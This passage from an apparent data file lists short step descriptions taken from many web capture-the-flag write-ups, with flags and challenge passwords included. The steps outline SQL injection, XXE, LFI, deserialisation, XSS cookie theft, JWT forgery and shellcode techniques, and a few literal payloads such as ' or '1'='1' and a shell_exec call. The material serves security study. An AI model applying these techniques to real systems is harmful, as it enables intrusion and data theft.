    "Access the given URL",
    "Participate in the CTF challenge",
    "Open the 'play.php' file",
    "Analyze the source code",
    "Craft a payload with a special SQL statement",
    "Test the vulnerability using the crafted payload",
    "Realize that the crafted payload successfully runs a SQL query",
    "Observe different messages based on query results",
    "Realize the limitations on the maximum attempts from the same IP address",
    "Understand that the IP address used to generate the token cannot be used to extract it",
    "Decide to generate the token from one IP address",
    "Create a SQL query to extract the data",
    "Specify the different IP address in the SQL query",
    "Write a Python script",
    "Use the Python script to discover the token",
    "Reset the session",
    "Generate and test the payload",
    "Increase the sleep time between requests",
    "Retrieve the discovered full token",
    "Enter the token into the provided form field",
    "Access the provided URL",
    "Submit the form",
    "Retrieve the flag",
    "Visit the website.",
    "Encounter an error page.",
    "Locate a line of PHP code within error logs.",
    "Identify an interesting file: require dirname(__DIR__).'/config/bootstrap.php';",
    "Find the entire path to an environment file.",
    "Access the PHP environment file.",
    "Locate one more environment: /secret_ctf_location/env.",
    "Visit 'https://web0.ctfsecurinets.com/_profiler/open?file=/secret_ctf_location/env'.",
    "Access the website hosting CTF.",
    "Find the feedback form on the website.",
    "Examine the feedback form on the website.",
    "Inspect the source code on the feedback form page.",
    "Discover that the feedback is sent via XML composed by JavaScript.",
    "Observe the server response.",
    "Receive a response from the server.",
    "Assess that remote code execution is not possible.",
    "Attempt to find the current working directory.",
    "Utilize the '/proc/self/' directory.",
    "Access the reference to the current working directory using 'cwd/'.",
    "Send a second POST request to /feed.php.",
    "Receive a response from the server.",
    "Confirm the successful staging of the attack.",
    "Extract the flag from the response.",
    "Connect to the website 'https://web5.ctfsecurinets.com/flags.php'",
    "Analyze the source files",
    "Identify that the vulnerability exists",
    "Find the usage of the username after authentication",
    "Pull the details of the user with the proper role",
    "Register a user with the malicious username input",
    "Log in with the found user 'root'",
    "Enter the password 'jjLLgTGk3uif2rKBVwqH'",
    "Connect to the website 'https://web5.ctfsecurinets.com/flags.php'",
    "Enter the username and password",
    "Reveal the flag",
    "Make the first commit to the repository.",
    "Download the 'last-revision' file from the target server.",
    "Download the 'dirstate' file from the target server.",
    "Download the 'pack-names' file from the target server.",
    "Use the BZR Check command to find any missing files.",
    "Download files from the target server.",
    "Set the script to continue downloading missing files.",
    "Recover the missing source files using Bazaar's 'revert' command.",
    "Identify two distinct changes to the 'index.php' file.",
    "Identify the revisions containing the changes.",
    "Identify the first change.",
    "Identify the Base64 encoded string.",
    "Identify the converted string as a Bitcoin Wallet password.",
    "Identify the second change.",
    "Identify the Hexadecimal string.",
    "Identify the AES ECB key for decoding the Bitcoin Wallet password.",
    "Use the OpenSSL tool to decode the Bitcoin Wallet password.",
    "Provide the AES ECB key and hex string as input.",
    "Decode the string.",
    "Reveal the flag.",
    "Browsed through the blog.",
    "Attempted to navigate to '.bzr' directory.",
    "Accessed 'README' file within '.bzr' directory.",
    "Confirmed a Bazaar repository's existence.",
    "Navigated to 'branch' folder within '.bzr' directory.",
    "Created a new directory titled 'ctf-bzr'",
    "Created 'foo.txt' file within the 'ctf-bzr' directory.",
    "Added 'foo.txt' file to the Bazaar repository.",
    "Committed the change to the repository.",
    "Removed 'foo.txt' from the 'ctf-bzr' directory.",
    "Downloaded the 'last-revision' file from the target server.",
    "Replaced the current 'last-revision' file with the downloaded one.",
    "Downloaded the 'dirstate' file from 'checkout' folder on the target server.",
    "Replaced the current 'dirstate' file with the newly downloaded one.",
    "Downloaded the 'pack-names' file from 'repository' folder on the target server.",
    "Ran 'bzr check' command in the command line.",
    "Observe the error indicating the names of the missing files.",
    "Downloaded the required files as outlined by the 'bzr check' error message.",
    "Ran the 'bzr status' command on the 'ctf-bzr' repository.",
    "Noted the mention of a removed 'index.php' file.",
    "Ran the 'bzr revert' command to restore the 'index.php' file.",
    "Verified that the 'index.php' file contains the flag.",
    "Connect to the website 138.247.13.115.",
    "Receive a message indicating the site is not served on this interface.",
    "Identify that the website is under HTTPS.",
    "Analyze the certificate.",
    "Discover that the certificate was created for the host 138.247.13.115.xip.io.",
    "Connect to the website 'https://138.247.13.115.xip.io/'.",
    "Visit the website.",
    "Identify that the website simulates a TODO list application.",
    "Understand that TODO notes of users can be read by enumerating URLs in a certain format.",
    "Assume that one of these notes contains the CTF flag.",
    "Write a Python script to automate the URL enumeration and flag discovery.",
    "Loop through a range of integers.",
    "Check if the page content contains 'MCA{'.",
    "If the content contains 'MCA{', print the content.",
    "Break the loop.",
    "Print any HTTP error during the page request.",
    "Pause the script for a random interval between 1 to 4 seconds.",
    "Run the script.",
    "Obtain the flag 'MCA{al3x4_5et_a_r3minder}'.",
    "Open the link provided in the CTF challenge - http://138.247.13.111",
    "Observe a web page",
    "Notice that incorrect answers submitted in the form fields are highlighted in red",
    "Perform internet searches concerning Alan Turing's life",
    "Gain the necessary information to answer the recovery questions",
    "Determine the correct answers to the security questions",
    "Enter '1' for 2 + 2 - 3 = ?",
    "Check 'Is it a leap year?' checkbox",
    "Check 'I agree Security Questions are Bad.' checkbox",
    "Obtain the flag from the webpage which reads: MCA{sms_2fa_is_bad_also}",
    "Connect to the provided URL",
    "Identify that the website accepts a 'name' parameter",
    "Analyze the read files page",
    "Discover that the 'name' parameter uses PHP serialization",
    "Locate the 'name' parameter in the '/proc/self/fd/9' file",
    "Realize the execution of PHP code when reading a file through LFI",
    "Include a PHP command in the 'name' parameter",
    "The PHP command is to display the ID of the current process",
    "Exploit LFI vulnerability to execute the PHP command",
    "Execute the 'ls -al' command",
    "Retrieve the list of files in the directory",
    "Identify the presence of a 'flag_is_here' directory",
    "Locate the 'flag_is_here' directory in the root directory",
    "Scan the contents of the 'flag_is_here' directory",
    "Discover the presence of a 'flag.txt' file",
    "Locate the 'flag.txt' file in the 'flag_is_here' directory",
    "Retrieve and examine the contents of the 'flag.txt' file",
    "Access the website of the challenge",
    "Perform an SQL injection attack on the login form",
    "Note that the initial SQL injection tactic yielded access but not the password",
    "Check if the password is the flag",
    "Understand that this approach seems to be working",
    "Realize manual checks are not efficient",
    "Write a Python script that automates this process",
    "Run the script to retrieve the password for the flag: gigem{h0peYouScr1ptedTh1s}",
    "Access the website: http://toomanycredits.tamuctf.com",
    "Identify an interaction with the website that involves a 'counter' cookie",
    "Evaluate sequential requests",
    "Realize that removing a portion of the 'counter' cookie triggers a zlib Input Error",
    "Recognize Java Serialization notation at the start of the base64 decoded string",
    "Determine the 'value' attribute is at the end of the Java serialized object",
    "Craft a malicious Java serialized object with a large 'value' to speed up the process",
    "Submit an HTTP request with the modified cookie",
    "Receive a page showing successful entry and the flag",
    "Visit the link provided in the challenge",
    "Submit the form presented on the webpage",
    "Observe the cookie 'not_admin' after form submission",
    "Alter the value of the 'not_admin' cookie",
    "Refresh the webpage",
    "Decode the base64 value.",
    "Attempt a command injection via the cookie.",
    "Inject the base64 version of the bash script.",
    "Enumerate the folder content.",
    "Find a 'flag' file.",
    "Print the 'flag' file content using a bash script.",
    "Encode the content via Base64.",
    "Pass the encoded content into the cookie.",
    "Retrieve the flag from the decoded base64 response.",
    "Access the URL: http://highsource.tuctf.com/",
    "Examine the page's source code.",
    "Find that the login process is performed via a JavaScript file (scripts/login.js).",
    "Discover a hardcoded password within the JavaScript file.",
    "Password found: 'I4m4M4st3rC0d3rH4x0rsB3w43'",
    "Return to the website.",
    "After logging in, retrieve the flag 'TUCTF{H1gh_S0urc3_3qu4ls_L0ng_F4ll}' from the site.",
    "Visit the website.",
    "Discover that the chat functionality was vulnerable to HTML tag injection.",
    "Note that messages were not being escaped.",
    "Perform a basic analysis of the cookies.",
    "Set up a listening server using 'netcat'.",
    "Insert an image reference with an 'onerror' attribute.",
    "Observe incoming requests.",
    "Identify incoming cookies from the victim's browser.",
    "Observe cookies carrying the 'secret' cookie.",
    "Note that the 'secret' cookie contains the flag.",
    "Access the target website.",
    "Observe that the website is a login form.",
    "Identify that the website is vulnerable to SQL injection.",
    "Enter the payload ' or '1'='1'.",
    "Realize that the password is the flag.",
    "Use the information obtained from the previous step.",
    "Construct a Python script.",
    "Automate the process of discovering the next character in the password.",
    "Run the script.",
    "Read the provided challenge.",
    "Attempt to access the URL `http://3.91.17.218/.git/`.",
    "Find another endpoint: `http://3.91.17.218/getimg.php?img=aW1nMS5qcGc%3D`.",
    "Identify that `aW1nMS5qcGc=` is a Base64 encoded string.",
    "Decode `aW1nMS5qcGc=` to identify it as `img1.jpg`.",
    "Reveal the source code of both `index.php` and `getimg.php`.",
    "Use knowledge of local git repository structure to start pulling files from the server's .git directory.",
    "Examine the `.git/logs/HEAD` file.",
    "Use commit IDs to determine when the flag was removed from the source.",
    "Use the commit IDs to fetch further git objects from the server.",
    "Attempt to checkout the master branch.",
    "Discover the missing git objects.",
    "Fetch the missing git objects from the server.",
    "Successfully restore the source code files on local machine.",
    "Attempt to show differences between the commit when the flag was removed and the commit when it was present.",
    "Encounter additional missing git objects.",
    "Fetch further missing git objects from the server.",
    "Retrieve the flag from the displayed differences.",
    "Inspect the webpage",
    "Identify two JavaScript files",
    "Observe the usage of JavaScript files when buttons are pressed",
    "Identify the specific JavaScript file",
    "Identify the specific JavaScript file",
    "Observe a normal interaction",
    "Perform a test with an invalid productId value",
    "Recognize the vulnerability associated with the parameter being reflected in the response",
    "Send the crafted payload",
    "Receive a response",
    "Observe the returned data",
    "Identify the presence of the flag utflag{n3xt_y3ar_go1ng_bl1nd}",
    "Inspect the webpage.",
    "Identify the Javascript file responsible for crafting the XML envelope.",
    "Identify the second Javascript file responsible for sending the XML envelope and reading the answer.",
    "Notice that a normal interaction involves passing a productId value.",
    "Test the system's reaction by passing an invalid productId value.",
    "Understand that due to the productId parameter being reflected in the response, the system may be susceptible to XXE attacks.",
    "Create a crafted payload utilizing XXE.",
    "Send the crafted payload.",
    "Receive a response from the server.",
    "Indicate that the exploitation of an XXE vulnerability was successful.",
    "Observe the returned data.",
    "Identify the flag utflag{n3xt_y3ar_go1ng_bl1nd} in the returned data.",
    "Analyzed the HTML source code.",
    "Entered the parameter '?source=1' in the HTTP request.",
    "Identified a potential SQL injection vulnerability.",
    "Reviewed online documentation.",
    "Constructed a base to perform SQL injection.",
    "Executed an HTTP request.",
    "Identified a flag table in the database.",
    "Used the SQL injection.",
    "Enumerated the columns of the flag table.",
    "Discovered a column named 'whatsthis'.",
    "Executed another HTTP request.",
    "Extracted the content of the 'whatsthis' table.",
    "Retrieved the flag from the table content.",
    "Analyzed the HTML source code.",
    "Discovered an interesting comment (?source=1).",
    "Entered ?source=1 as an HTTP parameter.",
    "Reviewed online documentation.",
    "Constructed a base to perform SQL injection.",
    "Identified a flag table in the database.",
    "Discovered a column named 'whatsthis'.",
    "Executed another HTTP request to extract the content of the 'whatsthis' table.",
    "Retrieved the flag from the table content.",
    "Analyzed the website behavior.",
    "Reviewed JavaScript 'index.js'.",
    "Understood the methods used for voting.",
    "Identified a voting procedure challenge.",
    "Noticed that each challenge string must be found every time it is called.",
    "Recognized the potential for optimization.",
    "Wrote a script to use a cache.",
    "Ensured the cache stores all attempts for generating the challenge strings.",
    "Implemented a smart voter script.",
    "Ensured the script utilizes a previously saved cache.",
    "Minimized time spent on creating strings to match the server's challenge.",
    "Script was launched causing the browser to start the voting process.",
    "Ensured the voting process continues until more than 250 votes are cast in the same PHP session.",
    "Observed the need for a server response after each vote.",
    "Understood obtaining the flag message requires waiting for such server response.",
    "Reached the total of 250 votes.",
    "Received the flag message returned by the server.",
    "Analyse the HTML code.",
    "Identify the CAPTCHA checkbox.",
    "Observe that the checkbox generates a random string.",
    "Note that the username is 'backd00r' and the password is 'catsrcool'.",
    "Examine the Python code.",
    "Modify the link used in the requests.get operation.",
    "Add the CAPTCHA parameter to the link.",
    "Create a payload.",
    "Create a HTTP request.",
    "Make a 'POST' call.",
    "Inspect the HTTP Response.",
    "Identify a redirection URL.",
    "Follow the redirection.",
    "Access the webpage after the redirection.",
    "Open one of the files.",
    "Locate the file named '(wtf.mp4)'.",
    "Discover the flag inside the file, in reversed order.",
    "Download the source code attached to the CTF challenge.",
    "Review the given source code, which is a Javascript calculator web app.",
    "Identify the constraints: the payload must be less than 30 characters and cannot contain 'zer0pts'.",
    "Realize that the Javascript function can print itself, including comments, if its name is returned.",
    "Identify that the structure of the script can be seen as something like '(x, y)()'.",
    "Identify that output content being checked for the presence of the string 'zer0pts', and devise a method to bypass it.",
    "Understand that you can convert a string to an array of chars in Javascript using the clause '[...p]'.",
    "Identify that the clause cannot be executed directly on 'p' as it 'is not iterable', and find a way to convert it to a string using concatenation.",
    "Create a payload that would fit the constraints and retrieve the flag.",
    "Summarize that the flag must be 'zer0pts{K4nt4n_m34ns_4dm1r4t1on_1n_J4p4n3s3}'.",
    "Discovered 'Report Vulnerability' message",
    "Understood the website allowed changing the theme via a URL parameter `theme='value'`",
    "Attempted payload to inject XSS via `theme`",
    "Identified failure due to Content Security Policy",
    "Discovered a script on the `index.php` page",
    "Identified the script calling `api.php` endpoint",
    "Tried passing custom callback parameter to `api.php` endpoint",
    "Hit a snag due to restrictions of the `trustedTypes` policy of CSP",
    "Injected payload for basic XSS execution with DOM Clobbering",
    "Decided to use the `jsonp` method",
    "Performed cross-origin request using `jsonp`",
    "Created `/evil/` endpoint for cookie grabbing script",
    "Created `/cookie/` endpoint for receiving exploited cookies",
    "Injected final payload to initiate the XSS",
    "Directed the cookies from the server to the `/cookie/` endpoint",
    "Received the cookies",
    "Began the CTF challenge.",
    "Speculated a connection with security protections such as WAF after noting certain factors.",
    "Examined the DIG records.",
    "Formulated a suspicion of possible Cloudflare protections.",
    "Contemplated on triggering a custom Cloudflare error.",
    "Recalled an instance from a known website (crunchyroll.com).",
    "..by inputting ' OR 1=1--'",
    "Find the /login/ endpoint using dirsearch.",
    "Find a www.zip file using dirsearch.",
    "Open the www.zip file.",
    "Find the source code of the web app in the www.zip file.",
    "Identify the login process in the file bookhub/forms.user.py.",
    "Notice that the login occurs only if the user's IP address is one of the whitelisted IP addresses or when the debug mode is enabled.",
    "Find that the get_remote_addr() function from the file bookhub/helper.py is used to get the user's IP address.",
    "Add the header X-Forwarded-For to the request.",
    "Suspect that a reverse proxy might be stripping the X-Forwarded-For header.",
    "Open http://18.213.16.123:5000/ in a web browser.",
    "Identify extra code for the debug mode in the file bookhub/views/user.py.",
    "Discover a bug in the /admin/system/refresh_session/ endpoint.",
    "Duplicate the server environment.",
    "Set up a redis server.",
    "Construct an exploit.",
    "Reveal that session data is stored as a serialized pickle python object.",
    "Refresh the CSRF token.",
    "Construct a payload to do a redis.call() to set the serialized object with the sessionID.",
    "Create a final script to send the command for flag extraction to the server.",
    "Open the provided URL.",
    "Observe a page that accepts another URL and submits it.",
    "Observe possibility of XSS attack from bot's lens.",
    "Visit the URL provided on the page.",
    "Analyze the source code of the page.",
    "Identify JavaScript functions that handle creation of iframe or appending script source.",
    "Identify a message event listener that conducts some checks on iframe data from URL.",
    "Notice a flaw in the check condition.",
    "Realize that the check should be for iframe value not being an object, not iframe itself.",
    "Create a payload without dots or double slashes.",
    "Use data URI in the form 'data:text/html;base64,<base64 data>' for the payload.",
    "Base64 encode an XMLHttpRequest.",
    "Structure the payload in JSON format.",
    "Add the JSON payload to the URL after the first '?' character.",
    "Submit the URL.",
    "Check the server logs.",
    "Have knowledge of a simple Web server written in Python",
    "The Web server handles only GET and POST requests with files",
    "Developed a suspicion of a directory traversal vulnerability",
    "The suspicion is related to either the GET path handling or the POST filename",
    "Added debug prints to the file for the GET path",
    "Added debug prints to the file for the POST filename",
    "The purpose of adding debug prints is to confirm the suspected vulnerability",
    "Exploited the discovered vulnerability",
    "The filename used in the request was 'lol.txt'",
    "The content written in the request was 'HACKED'",
    "Explored files that could be overwritten",
    "Cannot modify anything in '/home/manhndd/.ssh/'",
    "The reason for inability to modify is due to a lack of appropriate permission",
    "Made the decision to overwrite '.bashrc' file",
    "Engaged in a race with other players",
    "The absence of 'nc' and any exfiltration method restricts the options",
    "Write the flag to '/opt/mydank'",
    "'/opt' is the web facing directory",
    "Performed repetitive actions of sending requests",
    "Successfully won the race",
    "Acquired the flag",
    "Visit the website.",
    "Investigate the behaviour of appending different strings after the '/pleb' directory in the site URL.",
    "Conclude that '/pleb' and '/pleb.' work like domain Top Level Domains (TLDs).",
    "Set up a wildcard DNS listener.",
    "Observe the returned DNS query for example.com.",
    "Use nip.io wildcard DNS service.",
    "Send a request to '/pleb.127.0.0.1.nip.io'.",
    "Observe the returned localhost.",
    "Access the 'user' directory.",
    "Find an oddly-named nginx.conf file.",
    "Set up a listener.",
    "Use double URL encoding.",
    "Bypass the character restriction.",
    "Analyse the downloaded nginx.conf file.",
    "Leverage X-Accel-Redirect.",
    "Access the '/admin' directory.",
    "Set up a PHP script on '/pleb.my.ip.nip.io'.",
    "Reveal the '/admin' directory's contents.",
    "Find a flag.txt file in the '/admin' directory.",
    "Realize it is a misdirection towards '/useradmin'.",
    "Use the X-Accel-Redirect PHP script.",
    "Exploit the Off-by-Slash bug.",
    "Return the real flag in the 'uberadmin' directory.",
    "Identify that the challenge is a Cross-site Scripting (XSS) challenge.",
    "Recognize that the challenge involves exploiting a page to pop up an alert.",
    "Analyze the source code of the webpage.",
    "Recognize that the 'Markdown' converter uses regex.",
    "Recognize that all open HTML tags '<' have been removed.",
    "Determine that the removal of open HTML tags '<' makes a traditional XSS attack impossible.",
    "Identify a specific replace function within the source code.",
    "Decide to exploit the unsanitized 'alt' parameter.",
    "Create the final URL.",
    "Test the final URL.",
    "Read the problem's given details and description.",
    "Goal: Perform an XSS attack and make a URL to trigger alert(1) for getting the flag.",
    "Examine the provided source code.",
    "Source code uses a markdown library to convert markdown into HTML.",
    "Source code runs DOMPurify.",
    "Source code performs some validation.",
    "Notice that DOMPurify is applied on HTML.",
    "Acknowledge that DOMPurify is pretty secure.",
    "Realize it's unlikely they want me to find a vulnerability in DOMPurify.",
    "Saw a statement on DOMPurify's GitHub.",
    "Recognize from the source code that it is using jQuery's html() method.",
    "Notice that the SAFE_FOR_JQUERY flag is not being used.",
    "Look at the unit tests for the SAFE_FOR_JQUERY flag on DOMPurify's GitHub.",
    "Find a section in DOMPurify's unit tests.",
    "Test the payloads from the unit test in the challenge.",
    "Indicate a successful XSS attack.",
    "Create a URL with the successful payload.",
    "Identify that the challenge is written using the mermaid library",
    "Search for a way to embed an image into a mermaid flowchart",
    "Ensure that a valid graph can be created using a specific format",
    "Attempt to inject code with an embedded script",
    "Fail to inject the code with the embedded script",
    "Realize that the method failed",
    "Learn that backticks can be used instead of parentheses in JavaScript",
    "Create a working script",
    "Obtain the flag",
    "Visit the CTF challenge site.",
    "Analyze the form provided to upload images.",
    "Check the robots.txt on the site.",
    "Examine the source.zip file.",
    "Reveal all the source code.",
    "Download the source.zip file.",
    "Perform an immutable code inspection of upload.php.",
    "Identify serialization in the php code.",
    "Identify serialization in the __construct method.",
    "Identify serialization in the __destruct method.",
    "Host a document type definition (DTD).",
    "Identify the use of phar:// uri.",
    "Understand the need to create a controlled filename.",
    "Identify when __destruct would be called.",
    "Trigger command execution in the create_thumb function.",
    "Use a technique to disguise a valid phar file.",
    "Upload the disguised phar file.",
    "Create a phar file.",
    "Unserialize the phar file.",
    "Create an Image object with a controlled filename.",
    "Trigger the command './flag_dispenser' when the __destruct method is called.",
    "Trigger the execution of the flag_dispenser command.",
    "Retrieve the flag.",
    "Identified vulnerability in /api/image endpoint",
    "Injected FTP commands",
    "Used PORT ftp command",
    "Injected email queue in rabbitmq",
    "Used 'attachment' parameter",
    "Triggered an email with the flag as content",
    "Access the site at :5555",
    "Log in using user credentials",
    "Access the migrate.php page",
    "Enter new user_id and password",
    "Access the site at :7777",
    "Log in using new user_id and password",
    "Detect SQL injection vulnerability on INSERT statement",
    "Initiate data leaking process",
    "Cycle between accounts due to 1 minute delay in database reset on new site",
    "Dump all tables and columns",
    "Retrieve the flag",
    "Identify control over 'request.body.converter'.",
    "Implement '__defineSetter__' on 'converters'.",
    "Use sessionID as the first parameter.",
    "Create an object that resolves as a promise.",
    "Set 'flagConverted' on the previously set sessionID.",
    "Cause the promise to resolve.",
    "Trigger an error.",
    "Print the flag.",
    "Recognized that the 'basename()' function is used in the PHP script",
    "Observed that the 'basename()' function ignores invalid characters",
    "Designed a URL payload",
    "Included the path '/index.php/config.php/%ff?source' in the payload",
    "Injected an 'a' tag.",
    "Added the id=like to the injected 'a' tag.",
    "Injected the code to make the bot click our link and reveal the flag.",
    "Identify the presence of a create table statement vulnerability.",
    "Determine that the injection is limited to 32 characters.",
    "Find the validation function in the code.",
    "Discover the possibility of using a \"CREATE TABLE ... SELECT\" SQL statement.",
    "Understand how the SQL statement can transfer results from the select statement into a new table.",
    "Identify the unnecessary parts of the query that need to be wrapped in [] for it to become a valid query.",
    "Apply the necessary adjustments to the injection to ensure it fits within the limitations.",
    "Connect to the website link (http://3.112.91.135/)",
    "Observe a post message",
    "Conduct online research",
    "Analyze the code snippet",
    "Set IDSEED with 'id\u306e\u7a2e'",
    "Infer that the IP address has prefix 219",
    "Assume the posting date as the current date",
    "Generate a tripcode for each possible IP",
    "Execute the brute force PHP script",
    "Identify the correct matching tripcodes",
    "Form the flag",
    "Identify normal SSRF vulnerability in curl",
    "Exploit SSRF vulnerability to gain access to NFS filesystem",
    "Create symlink on NFS filesystem using the SSRF exploit",
    "Utilize SSRF exploit to write to the created symlink",
    "Overwrite the index.html file",
    "Flip one random bit in the wordpress installation",
    "Flip the comparison check in /var/www/html/wp-includes/user.php at position 5389",
    "Modify the comparison to always allow login even with incorrect password",
    "Log in as admin",
    "Upload PHP shell",
    "Read the flag",
    "Analyze the PHP script.",
    "Understand that if the IP is from Norway, YAML parses 'NO' as False.",
    "Realize that YAML parsing 'NO' as False allows bypassing escapeshellargs.",
    "Perform a command injection.",
    "Exploit the vulnerability.",
    "Leak source code.",
    "Use interp to evaluate Golang at runtime from cookie.",
    "Get arbitrary code execution.",
    "Realize 'os.exec' is blocked.",
    "Use 'os.StartProcess' instead.",
    "Create a function named 'api'.",
    "Read the file 'satellite.txt'.",
    "Define 'os.ProcAttr'.",
    "Assign file descriptors for standard input, output, and error handling.",
    "Start a new process.",
    "Wait for the process to complete.",
    "Return the content of 'satellite.txt'.",
    "Refer to a writeup for information on crafting the AJP request.",
    "Inspect the response from index.jsp.",
    "Determine the required fake address.",
    "Submit the crafted request to the server.",
    "Extract the system flag from the response.",
    "Obtain the payload generated by the exploit script.",
    "Open a web browser.",
    "Enter the provided URL in the address bar.",
    "Follow the URL redirection (if applicable) to the file location.",
    "Open the file using an appropriate application or viewer.",
    "Read and retrieve the flag from the displayed contents.",
    "Decode the jwt cookie",
    "Pass the decoded cookie to the 'app.render' function",
    "Set the 'view options' setting",
    "Run command line script using curl",
    "Execute child process for reading the flag file",
    "Email only required to start validly",
    "Any characters allowed after the valid start of email",
    "Inputted negative 'rate' value",
    "Injected arbitrary HTML",
    "HTML rendering by pdfkit/wkhtmltopdf",
    "Injected iframe",
    "Used leaked secret key",
    "Faked session with 'is_admin' privileges",
    "Identified the challenge as an XPATH injection challenge.",
    "Decided to find a paper that was not published.",
    "Created an XPATH injection payload.",
    "Recognize the calculator app filters out potential XSS attacks",
    "Analyze 'calc.js'",
    "Identify controllable variables in 'calc.js'",
    "Identify ability to control 'astProgram.type' variable",
    "Understand the variable sets the type attribute for the script element",
    "Decide to provide code in the form of JSON object",
    "Realize 'JSON.parse()' will parse the provided code JSON",
    "Decide to switch 'astToJs' to 'evalCode'",
    "Understand this switch allows the execution of custom code within the app",
    "Decide to use Import Maps",
    "Understand using Import Maps will help in switching 'astToJs' to 'evalCode'",
    "Decide to create a new HTML script element",
    "Set 'program' as the id for the new HTML script element",
    "Set 'json' as the language attribute for the new HTML script element",
    "Set 'importmap' as the type attribute for the new HTML script element",
    "Inside the new HTML script element, decide to add an 'imports' key",
    "Set the 'imports' key to map '/js/ast-to-js.mjs' to '/js/eval-code.mjs'",
    "Decide to add custom JavaScript code to the 'code' key",
    "Understand this custom JavaScript code will leak the cookie",
    "Decide to execute a Python script (solve.py)",
    "Obtain the flag through the execution of solve.py",
    "Use /apisix/batch-requests endpoint.",
    "Analyze the contents of the 'server.py' file.",
    "Understand the workflow of the Flask web server.",
    "Review the code of the 'query_login_attempt' function.",
    "Enter an empty username and arbitrary password.",
    "Successfully log in to the system.",
    "Inspect the code of the 'query_kill_time' function.",
    "Create an SQL injection payload.",
    "Execute the SQL injection payload created in the previous step.",
    "Manipulate the query using the union operation.",
    "Access the 'target_credentials' database.",
    "Identify the 'secret_key' column within the database.",
    "Discover the flag 'rwctf{t0-h4ck-$kynet-0r-f1ask_that-Is-th3-questi0n}' in the 'secret_key' column of the database.",
    "Checked 'req.files' in check.js.",
    "'next()' was called in each iteration causing express to continue.",
    "Uploaded a larage number of valid files.",
    "Used previous step's vulnerability to upload.",
    "Read the file 'apache.conf'.",
    "Combined output filter.",
    "Used 'SetEnv LD_PRELOAD' to execute code when running gzip.",
    "Referenced 'solv.py' file.",
    "Finalized the solution.",
    "Access and examine the source code of the website.",
    "Identified the condition that only PDF files containing 'ECHO' would be signed.",
    "Identified the 'openssl_verify' function in website source code.",
    "Understood the function is used to sign PDF files.",
    "Understood default signature algorithm of openssl_verify is SHA1.",
    "Realized the susceptibility of SHA1 algorithm for PDFs.",
    "Utilized SHATTERED tool.",
    "Exploited SHA1 vulnerability using SHATTERED.",
    "Created two PDFs with same SHA1 hash exploiting the SHA1 vunlerability with SHATTERED.",
    "Retrieved the signature from the first signed PDF.",
    "Applied the retrieved signature to the second PDF.",
    "The server recognized the signature and provided the flag.",
    "Visit the targeted website.",
    "Notice the presence of a PHP eval function.",
    "Encounter challenges while trying to navigate up directories.",
    "Attribute the challenges to the `basedir` restriction.",
    "Take a break.",
    "Have a clearer perspective.",
    "Investigate the source code of the website.",
    "Look for any unusual strings.",
    "Notice the mention of `shell_exec` on the website.",
    "Guess that `shell_exec` might be allowed on the website.",
    "Run the command `echo shell_exec(\"../flag\");` on the website.",
    "Observe successful execution of the command.",
    "Successfully obtain the flag.",
    "Log into the website.",
    "Encounter a message saying browser is unsupported.",
    "Move into burp suite.",
    "Notice a 302 found page.",
    "Page contains some HTML and JavaScript.",
    "Identify a scoped style attribute.",
    "Identify a `navigator.battery.charging call` in the JavaScript.",
    "Deduce that style scoped only works in Firefox versions 21-54.",
    "Brute-force user-agent strings in burp suite.",
    "Use version 43.0 for the user-agent string.",
    "Successfully extract the flag: OOO{0ld@dm1nbr0wser1sth30nlyw@y}",
    "The challenge entailed shellcoding in the context of PHP to make SQL queries under a sandbox environment.",
    "Identified the presence of a shared object entitled `shellme.so`.",
    "Noticed a website related to the challenge.",
    "Reviewed the source code.",
    "Determined that sending a GET request with 'source' as a parameter reveals the source code.",
    "Identified from the source code that a POST request with 'shell' as a parameter echoes the input.",
    "Understood that the echoed input is sent to the `shellme()` function with a character limit of 1000.",
    "Tracked the function `shellme()` inside the `shellme.so` shared object file.",
    "Found that `shellme()` leads to the function `shell_this()`.",
    "Identified that the input is copied to a mmap-ed memory region within the function.",
    "Noticed the use of `SECCOMP_MODE_STRICT` seccomp sandbox.",
    "Determined that it allows only read, write, and exit syscalls before executing the input.",
    "Identified the use of strlen() function within the code.",
    "Realized this would truncate any shellcode at null bytes.",
    "Reviewed the PHP code closely.",
    "Read the challenge's description.",
    "Identified that the File Descriptor (FD) for MySQL server connection is open before shellcode execution.",
    "Understood that the server is running php-cgi.",
    "Wrote the received response to stdout.",
    "Referenced the MySQL documentation related to the protocol level.",
    "Wrote the cgi header with 'Content-type: text/html'.",
    "Set up a Python-based environment.",
    "Designed the shellcode.",
    "Employed the JMP - CALL - POP technique within the shellcode to acquire strings in the registers.",
    "Transformed relative JMPs into PLT type trampolines.",
    "This was done to prevent large JMPs containing null bytes.",
    "Introduced NOP Sled to efficiently manage oversized jumps.",
    "Created the shellcode ensuring it has no NULL bytes.",
    "Executed the verified and assembled shellcode.",
    "Wrote the received response as the final output.",
    "Opened the CTF challenge.",
    "Read the initial text.",
    "No success in submitting the answers.",
    "Decided to open the Network tab.",
    "Opened the Google Chrome console.",
    "Found a JSON response.",
    "Read the message in the JSON response.",
    "Understood from the JSON response.",
    "Used the flag present in the JSON response.",
    "Analyze the challenge",
    "Take note of the embedded iframe",
    "Take note that the embedded iframe is within the same origin",
    "Take note that the data is sanitized by DOMPurify",
    "Understand that the challenge is to bypass a script inside the iframe",
    "Understand that the script validates the origin and ID of the message",
    "Understand that the script prevents rendering of the body content",
    "Identify the need to steal the saved note",
    "Understand that the challenge involves a Same-Origin XSS attack",
    "Observe from user session that the identifier is stored",
    "Observe from user session that the session cookie was set to Lax",
    "Acknowledge that the challenge involves bypassing origin check",
    "Acknowledge that the bypass involves embedding the iframe",
    "Acknowledge that the bypass involves forcing a 'null' origin",
    "Recognize that pop-ups from a sandboxed page inherit sandbox attributes",
    "Recognize that 'allow-popups-to-escape-sandbox' can prevent the inheritance of sandbox attributes by pop-ups",
    "Open a pop-up to the target URL",
    "Open the target URL",
    "Implement the series of steps",
    "Navigate to the website",
    "Right click on the webpage",
    "Select 'Inspect' or 'Inspect Element'",
    "Open the Inspect Element tool",
    "Navigate to the 'Sources' tab",
    "Inspect the visible scripts",
    "Explore the source code files",
    "Find the flag in the source code",
    "Recognize that the challenge focuses on hacking the JWT cookie",
    "Understand that to obtain the flag, the secretid must match the length of the secrets array and the permissions must be set to 'admin'",
    "Identify that the server adds a new secret to the secrets array every time a cookie is signed",
    "Note that the server does not perform security checks on the alg or secretid fields in the JWT",
    "Create a JWT with the permissions set to 'admin' and the secretid set to a string that does not exist in the secrets array",
    "Encode the JWT by setting the algorithm to 'none'",
    "Send the malicious JWT to the server",
